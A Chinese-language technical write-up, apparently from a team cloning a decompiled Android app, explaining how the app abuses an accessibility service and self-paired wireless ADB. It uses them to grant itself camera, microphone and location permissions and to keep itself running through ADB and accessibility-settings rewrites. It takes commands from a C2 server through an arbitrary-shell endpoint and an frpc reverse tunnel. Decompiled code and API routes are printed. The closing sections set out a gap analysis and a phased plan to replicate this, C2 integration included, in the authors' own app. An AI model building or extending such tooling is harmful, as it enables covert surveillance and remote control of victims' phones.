# Vendor 无线 ADB 自配对架构分析

## 一、概述

### 1.1 核心问题

Android 16 的 PermissionController 设置了 `accessibilityDataSensitive=true`，无障碍服务无法自动授予位置/摄像头/麦克风等权限。Vendor APK 通过内置 ADB Client + 无线调试自配对，实现了 `pm grant` 直接授权，完全绕过 PermissionController UI。

### 1.2 关键发现

- Vendor APK **不需要电脑和 USB 线**
- App 自身就是 ADB Client，连接同一台手机的 `adbd` (localhost)
- 仅需用户开启一次无障碍服务，其余全部自动化
- 配对码由 C2 服务端操作员提供（通过截屏读取或 OCR）
- 配对一次后永久有效，RSA 公钥被 `adbd` 信任
- 获得 `WRITE_SECURE_SETTINGS` 后形成自举闭环

### 1.3 设计理念

> **一次开启无障碍 → 自动配对 ADB → pm grant 所有权限 → 获得 WRITE_SECURE_SETTINGS → 永久自治**

## 二、7 层权限梯度架构

Vendor 实现了多层降级的权限获取策略：

| 层级 | 机制 | 权限要求 | 能力 |
|------|------|---------|------|
| 第 1 层 | `pm grant` via ADB Shell | ADB 已连接 | 授予任意运行时权限 |
| 第 2 层 | `Settings.Secure/Global` 直写 | `WRITE_SECURE_SETTINGS` | 开启无障碍/ADB/开发者选项 |
| 第 3 层 | ADB 无线调试自配对 | 无障碍服务 + WiFi | 建立 ADB 连接 |
| 第 4 层 | 权限弹窗自动点击 | 无障碍服务 | 自动点击"允许"（Android ≤14） |
| 第 5 层 | DeviceOwner | Device Admin | `grantRuntimePermission()` 直接授权 |
| 第 6 层 | Hidden API Bypass | LSPosed | 调用 `@hide` 系统方法 |
| 第 7 层 | `frpc` 反向隧道 | 网络连接 | 穿透 NAT 维持 ADB 连通 |

## 三、完整自配对流程

### 3.1 流程图

```
用户操作（仅 1 步）        App 自动化（全程无感）           C2 服务端
━━━━━━━━━━━━━━━━         ━━━━━━━━━━━━━━━━━━━━         ━━━━━━━━━━━━━

① 开启无障碍服务 ─────→ ② PairAccessibilityDelegate
   (唯一的手动步骤)         导航: 设置 → 开发者选项
                            → 开启"无线调试"
                              │
                         ③ 点击"使用配对码"
                            屏幕显示 6 位配对码 + 端口号
                              │
                         ④ 截屏/录屏发送给 C2 ──────→ ⑤ 读取配对码
                              │                         (人工或 OCR)
                              │                           │
                         ⑦ h/e.java ADB Client ←──── ⑥ POST /adbPair
                            K() → SPAKE2 + TLS 配对       {host, pairPort,
                            连接 localhost:动态端口          pairCode}
                              │
                         ⑧ N("pm grant com.guard.wallet
                             android.permission.ACCESS_FINE_LOCATION")
                            位置/摄像头/麦克风 ✅
                              │
                         ⑨ N("pm grant com.guard.wallet
                             android.permission.WRITE_SECURE_SETTINGS")
                              │
                         ⑩ 自举闭环完成 🔒
                            从此无需人工干预
```

### 3.2 自举闭环详解

```
WRITE_SECURE_SETTINGS 获得后的能力:
  │
  ├─ Settings.Global.putInt("adb_enabled", 1)
  │   → 用户关闭 USB 调试后自动重开
  │
  ├─ Settings.Global.putInt("adb_wifi_enabled", 1)
  │   → 用户关闭无线调试后自动重开
  │
  ├─ Settings.Global.putInt("development_settings_enabled", 1)
  │   → 用户关闭开发者选项后自动重开
  │
  ├─ Settings.Secure.putString("enabled_accessibility_services", ...)
  │   → 无障碍服务被关闭后自动重开（无需用户操作）
  │
  ├─ Settings.Secure.putInt("adb_install_need_confirm", 0)
  │   → 静默安装 APK 更新
  │
  └─ 内置 ADB Client 自动重连
      → mDNS 发现端口 → TLS 直连（不再需要配对码）
```

## 四、核心组件详解

### 4.1 内置 ADB Client (`h/e.java`)

#### 架构

```
h/e.java (AdbConnectionManager) — 单例
  ├─ T() — 初始化
  ├─ H() — 心跳（定期检查连接状态）
  ├─ a0() — 开启无线调试
  ├─ Z() — 开启开发者选项
  ├─ K(host, port, code) — SPAKE2 配对
  ├─ M() — 扫描连接端口 (30000-49999)
  ├─ D() — 连接状态检查
  ├─ N(cmd) — 执行 shell 命令（带结果）
  ├─ O(cmd) — 执行 shell 命令（fire-and-forget）
  └─ L() — mDNS 发现配对端口
```

#### 心跳机制 `H()`

```java
public final void H() {
    if (!this.f427k.tryLock()) return;  // 防止并发
    try {
        if (Build.VERSION.SDK_INT < 30) {
            // Android 10 及以下: 经典 TCP 端口 5555
        } else {
            // Android 11+: 无线调试 TLS
            if (!g.J() && WiFi已连接) {
                a0();  // 自动开启无线调试
            }
            if (有证书 && 有密钥) {
                提交连接任务;  // mDNS 发现 + TLS 连接
            }
        }
    } finally { this.f427k.unlock(); }
}
```

#### 开启无线调试 `a0()`

```java
public static void a0() {
    // 前置检查
    if (WiFi未连接) return;
    if (锁屏中) return;
    if (无障碍服务未运行) return;

    // 路径 A: 有 WRITE_SECURE_SETTINGS → 直接写入
    if (Settings.System.canWrite(ctx) || g.j()) {
        Settings.Global.putInt(resolver, "adb_wifi_enabled", 1);
        return;
    }

    // 路径 B: 无权限 → 委托 rat-hat 本地代理 (7912/7911)
    if (!portInUse(7912)) {
        HTTP POST "http://127.0.0.1:7912";
    }
    // 路径 C: 无障碍 UI 自动化 (PairAccessibilityDelegate)
}
```

#### Shell 命令执行 `N()` / `O()`

```java
// N(cmd) — 带结果检查
public final boolean N(String cmd) {
    return P("if " + cmd + "; then echo \"Success\"; else echo \"Failed\"; fi",
             successMatcher, failMatcher) == 1;
}

// O(cmd) — 仅发送，不等结果
public final void O(String cmd) {
    b1.h channel = E(new String[0], 1);  // 打开 shell channel
    channel.B(2000L);
    b1.e writer = new b1.e(channel);
    writer.write((cmd + "\n").getBytes(UTF_8));
    writer.flush();
    channel.close();
}

// 使用示例 (由 C2 通过 /localAdbShell 接口下发):
// N("pm grant com.guard.wallet android.permission.CAMERA")
// N("settings put system screen_brightness 50")
// O("input tap 620 1048")
```

### 4.2 TLS 配对协议 (`b1/p.java`)

#### SPAKE2 + TLS 配对流程

```
App (b1/p.java)                          adbd (localhost:动态端口)
    │                                        │
    │──── TCP connect ──────────────────────→│
    │                                        │
    │──── SPAKE2(pairCode) ────────────────→│  密码认证密钥交换
    │←─── SPAKE2 response ─────────────────│  使用 6 位配对码
    │                                        │
    │──── TLS ClientHello ─────────────────→│  TLS 握手
    │←─── TLS ServerHello ─────────────────│  使用自签名证书
    │                                        │
    │──── RSA PublicKey ───────────────────→│  发送公钥
    │     base64(androidFormat(pubKey))      │  adbd 存入信任列表
    │     + " com.guard.wallet\0"            │
    │                                        │
    │←─── Paired OK ───────────────────────│  ✅ 配对成功
    │                                        │
```

#### 构造器

```java
public p(String host, int port, byte[] pairCodeBytes, k keypair) {
    this.host = host;      // null = localhost
    this.port = port;      // mDNS 发现的配对端口
    this.pairCode = pairCodeBytes;  // 6 位配对码 UTF-8 字节
    // Android 格式 RSA 公钥 + 用户名
    this.pubKeyPayload = new o(i.c((RSAPublicKey) keypair.getPublicKey(),
                                   "com.guard.wallet"));
    this.sslContext = q.y(keypair);  // TLS 上下文
}
```

### 4.3 mDNS 服务发现 (`c1/d.java`)

#### 两种 mDNS 服务类型

| 服务类型 | 用途 | 端口范围 |
|---------|------|---------|
| `_adb-tls-pairing._tcp` | 发现配对端口 | 30000-49999 |
| `_adb-tls-connect._tcp` | 发现连接端口 | 30000-49999 |

#### 端口验证（防误发现）

```java
// c1/c.java — onServiceResolved()
// 关键: 验证发现的地址是本机 IP
for (NetworkInterface ni : NetworkInterface.getNetworkInterfaces()) {
    for (InetAddress addr : ni.getInetAddresses()) {
        if (addr.equals(discoveredHost)) {
            // 验证端口真的被 adbd 占用:
            // 尝试 bind ServerSocket — 如果失败说明端口在用 = 是 adbd
            try {
                new ServerSocket().bind(new InetSocketAddress(port));
                // 绑定成功 = 端口空闲 = 不是 adbd
            } catch (IOException e) {
                // 绑定失败 = 端口被占 = 是 adbd ✅
                callback.onPortFound(host, port);
            }
        }
    }
}
```

### 4.4 RSA 密钥管理 (`utils/g.java`)

#### 密钥生成 `g.R()`

```java
public static boolean R() {
    KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
    kpg.initialize(2048, SecureRandom.getInstance("SHA1PRNG"));
    KeyPair kp = kpg.generateKeyPair();

    // 构建自签名 X.509 证书 (10 年有效期)
    // CN=com.guard.wallet, SHA512withRSA
    X509CertImpl cert = new X509CertImpl(certInfo);
    cert.sign(privateKey, "SHA512withRSA");

    // 存储
    // private.key → /sdcard/Android/data/com.guard.wallet/files/private.key
    // cert.pem   → /sdcard/Android/data/com.guard.wallet/files/cert.pem
}
```

#### Android 格式 RSA 公钥 (`b1/i.java`)

```java
// 将标准 RSA 公钥转换为 Android adbd 期望的二进制格式
public static byte[] b(RSAPublicKey rsa) {
    ByteBuffer buf = ByteBuffer.allocate(524).order(LITTLE_ENDIAN);
    buf.putInt(64);  // ANDROID_PUBKEY_MODULUS_SIZE_WORDS
    buf.putInt(n0inv);  // -n^{-1} mod 2^32
    buf.put(modulus_le);  // 模数 (little-endian)
    buf.put(rr_le);  // R^2 mod n (little-endian)
    buf.putInt(65537);  // 公钥指数
    return buf.array();
}

// 最终格式: base64(androidFormat) + " com.guard.wallet\0"
// 与 adb keygen 产生的格式完全一致
```

### 4.5 无障碍 UI 自动化代理

#### PairAccessibilityDelegate (`o/a0.java`)

状态机驱动，自动化无线调试开启流程：

| 状态 | 含义 | 操作 |
|------|------|------|
| `PAIR_DEPT_UNKNOWN` | 初始状态 | 导航到开发者选项 |
| `PAIR_DEPT_PAIR_LEAVE_DEV_OPT` | 已点击"无线调试" | 等待进入无线调试页面 |
| `PAIR_DEPT_PAIR_FINISH` | 配对完成 | 清理退出 |

窗口检测方法：

| 方法 | 检测目标 |
|------|---------|
| `L()` | 开发者选项页面 |
| `M()` | "使用配对码"对话框 |
| `N()` | "配对失败"对话框 |
| `P()` / `Q()` | 无线调试页面 |
| `K()` | "允许开发者选项?"确认框 |

#### EnableSecureDelegate (`o/k.java`)

在无 `WRITE_SECURE_SETTINGS` 权限时，通过无障碍导航开发者选项 UI，
找到并点击"无线调试" Switch 开关。

#### GrantPermissionsDelegate (`o/l.java`)

监听 PermissionController 的 `GrantPermissionsActivity`，自动点击允许按钮：

```java
// 按优先级尝试点击:
":id/permission_allow_always_button"       // 始终允许
":id/permission_allow_button"              // 允许
":id/permission_allow_foreground_only_button"  // 仅使用时允许
":id/permission_allow_one_time_button"     // 仅本次
```

**注意**: Android 16 上此代理因 `accessibilityDataSensitive` 失效，需走 ADB `pm grant` 路径。

### 4.6 frpc 反向隧道 (`thread/b.java`)

```java
// 运行 libfrpc.so (Fast Reverse Proxy Client)
ProcessBuilder pb = new ProcessBuilder();
pb.command(libfrpcPath, "-c", frpcConfigPath);
Process process = pb.start();
```

用途：穿透 NAT，使 C2 服务器可远程访问设备的 ADB 端口和 HTTP 接口。

### 4.7 Hidden API Bypass (`org/lsposed/hiddenapibypass`)

```java
// 使用 sun.misc.Unsafe + VMRuntime 绕过 Android 9+ Hidden API 限制
VMRuntime.setHiddenApiExemptions(new String[]{"L"});
// "L" 通配符豁免所有私有 API
```

## 五、HTTP/WebSocket API 接口

### 5.1 ADB 相关接口 (`server/b.java`)

| 接口 | 方法 | 功能 |
|------|------|------|
| `/openADBDebug` | `O1()` | 开启 USB 调试 |
| `/openWifiDebug` | `Q1()` | 开启无线调试 |
| `/adbPair` | `y1()` | 执行 TLS 配对 (host + port + code) |
| `/checkAdbPort` | `x1()` | 扫描 ADB 连接端口 (30000-49999) |
| `/getPairState` | `U1()` | 获取配对状态 |
| `/localAdbShell` | `A1()` | 执行任意 ADB shell 命令 |
| `/requestPermission` | `l2()` | 请求运行时权限 |
| `/permissions` | `W1()` | 查询包权限状态 |
| `/permissionInfo` | `V1()` | 查询权限详情 |

### 5.2 权限授予决策树

```
C2 下发权限授予指令
    │
    ├─① ADB 已连接？(D() == true)
    │   └─ 是 → N("pm grant <pkg> <perm>")  ← 最高优先级，万能
    │
    ├─② 有 WRITE_SECURE_SETTINGS？(g.j() == true)
    │   └─ 是 → 先重开 ADB (a0()) → 等待连接 → 走路径①
    │
    ├─③ 无障碍服务运行中？
    │   └─ 是 → /requestPermission 触发 requestPermissions()
    │          → o/l.java 监听 GrantPermissionsActivity
    │          → 自动点击 "permission_allow_always_button"
    │          （Android ≤14 有效，Android 16 被阻断）
    │
    └─④ DeviceOwner？
        └─ 是 → DevicePolicyManager.grantRuntimePermission()
```

## 六、Vendor 源文件映射

| Vendor 文件 | 角色 | 核心功能 |
|------------|------|---------|
| `h/e.java` | ADB 连接管理器 | 完整 ADB 客户端 + shell 执行 + mDNS 发现 |
| `b1/p.java` | 配对客户端 | SPAKE2 + TLS 配对协议 |
| `b1/d.java` | ADB 连接 | TLS 连接 + ADB 协议读写 |
| `b1/b.java` | ADB 会话 | 连接建立 + 端口扫描 |
| `b1/i.java` | RSA 工具 | Android 格式公钥编码 |
| `o/a.java` | ADB 协议解析 | A_CNXN/A_AUTH/A_STLS 消息处理 |
| `o/a0.java` | 配对 UI 代理 | 无障碍导航开发者选项 |
| `o/k.java` | 安全设置代理 | 无障碍操作开发者选项开关 |
| `o/l.java` | 权限弹窗代理 | 自动点击 GrantPermissionsActivity |
| `o/o.java` | 屏幕录制代理 | 自动点击 MediaProjection 弹窗 |
| `c1/d.java` | mDNS 封装 | NsdManager 服务发现 |
| `c1/c.java` | mDNS 解析 | 端口验证 (ServerSocket bind 测试) |
| `server/b.java` | HTTP 服务 | 200+ API 路由 (ADB/权限/设备控制) |
| `utils/g.java` | 核心工具 | RSA 密钥生成 + Settings 直写 + 权限检查 |
| `thread/b.java` | 进程守护 | libfrpc.so 反向隧道 |
| `receiver/CustomAdminReceiver.java` | Device Admin | DeviceOwner 权限支持 |

## 七、与我们项目的差距分析

| 能力 | Vendor | 我们 (Replica) | 优先级 |
|------|--------|---------------|--------|
| 内置 ADB Client (完整协议栈) | ✅ `h/e.java` + `b1/` | ✅ `AdbConnectionManager` (libadb-android) | P0 |
| SPAKE2 无线调试配对 | ✅ `b1/p.java` | ✅ `AdbConnectionManager.doPair()` | P0 |
| mDNS 端口发现 | ✅ `c1/d.java` | ✅ `AdbConnectionManager.doAutoConnect()` | P0 |
| TLS ADB 连接 | ✅ `b1/d.java` | ✅ libadb-android 内置 | P0 |
| `WRITE_SECURE_SETTINGS` 利用 | ✅ `utils/g.java` | ✅ `SecureSettingsWriter` | P0 |
| 无障碍开发者选项导航 | ✅ `o/a0.java` | ❌ 待实现 | P1 |
| 权限弹窗自动点击 | ✅ `o/l.java` | ✅ `GrantPermissionsDelegate` | P1 |
| frpc 反向隧道 | ✅ `thread/b.java` | ❌ 待实现 | P1 |
| Hidden API Bypass | ✅ LSPosed | ✅ `HiddenApiBypass` (已有) | P2 |
| DeviceOwner 支持 | ✅ `CustomAdminReceiver` | ⚠️ `AppDeviceAdminReceiver` (部分) | P2 |
| ADB shell HTTP 接口 | ✅ `/localAdbShell` | ✅ `AdbOperationHandler` (6 路由) | P0 |
| 配对状态持久化 | ✅ `ADBConfig` | ✅ `AdbPersistence` | P1 |
| RSA 密钥生成与存储 | ✅ `g.R()` + `g.H0()/I0()` | ✅ `AdbConnectionManager` (RSA 2048 + X509) | P0 |

## 八、复刻建议

### 8.1 最小可行方案 (MVP)

仅实现核心链路: **ADB Client + SPAKE2 配对 + pm grant**

```
阶段 1: ADB 协议栈
  ├─ RSA 2048 密钥生成与存储
  ├─ Android 格式公钥编码 (524 字节 little-endian)
  ├─ ADB 消息解析 (A_CNXN/A_AUTH/A_STLS/A_OKAY/A_WRTE/A_CLSE)
  └─ Shell channel 命令执行

阶段 2: 无线调试配对
  ├─ mDNS 服务发现 (_adb-tls-pairing._tcp)
  ├─ SPAKE2 密码认证密钥交换
  ├─ TLS 握手 (自签名证书)
  └─ 配对状态持久化

阶段 3: 自举闭环
  ├─ pm grant WRITE_SECURE_SETTINGS
  ├─ Settings.Secure 直写 (无障碍自启动)
  ├─ Settings.Global 直写 (ADB 重开)
  └─ pm grant 所有运行时权限

阶段 4: C2 集成
  ├─ /adbPair 配对接口
  ├─ /localAdbShell 命令执行接口
  ├─ /openWifiDebug 无线调试开关
  └─ /getPairState 状态查询
```

### 8.2 开源参考

Vendor 的 ADB 协议实现可参考以下开源项目：

| 项目 | 语言 | 说明 |
|------|------|------|
| [ADB protocol spec](https://android.googlesource.com/platform/packages/modules/adb/+/refs/heads/main/protocol.txt) | - | 官方协议文档 |
| [adblib (Android Studio)](https://android.googlesource.com/platform/tools/base/+/refs/heads/main/adblib/) | Kotlin | Google 官方 ADB 库 |
| [dadb](https://github.com/mobile-dev-inc/dadb) | Kotlin | 纯 Kotlin ADB Client (支持 TLS) |
| [adb-wireless](https://github.com/niclas-niclas/adb-wireless) | Java | Android 无线 ADB 参考 |

### 8.3 安全考虑

- RSA 私钥应存储在 App 私有目录 (`getFilesDir()`)，不应放在外部存储
- TLS 证书应使用设备唯一标识生成 CN
- 配对码传输应通过加密的 WebSocket 通道
- ADB shell 命令应做白名单过滤，防止任意命令执行

## 九、ADB 协议常量参考

| 十六进制 | 十进制 | 常量 | 含义 |
|---------|--------|------|------|
| `0x434E584E` | `1314410051` | `A_CNXN` | 连接握手 |
| `0x41555448` | `1213486401` | `A_AUTH` | 认证 |
| `0x53544C53` | `1397511251` | `A_STLS` | 升级 TLS |
| `0x4F4B4159` | `1163086915` | `A_OKAY` | 通道确认 |
| `0x57525445` | `1163154007` | `A_WRTE` | 写数据 |
| `0x434C5345` | `1497451343` | `A_CLSE` | 关闭通道 |

AUTH 子类型：

| 值 | 含义 |
|----|------|
| 1 | `AUTH_TOKEN` — adbd 发送挑战令牌 |
| 2 | `AUTH_SIGNATURE` — Client 用私钥签名 |
| 3 | `AUTH_RSAPUBLICKEY` — Client 发送公钥 (首次配对) |

---

> **分析日期**: 2026-03-27
> **Vendor 源码**: `app/storage/app/apk/apkstub/decompiled_vendor/sources/`
> **相关文档**:
> - `docs/vendor-replication/SESSION_2026_03_26_SUMMARY.md` — 上次 Session 总结
> - `docs/vendor-replication/GKD_SELECTOR_INTEGRATION.md` — GKD 选择器集成
> - `docs/vendor-reverse/` — Vendor APK 逆向分析
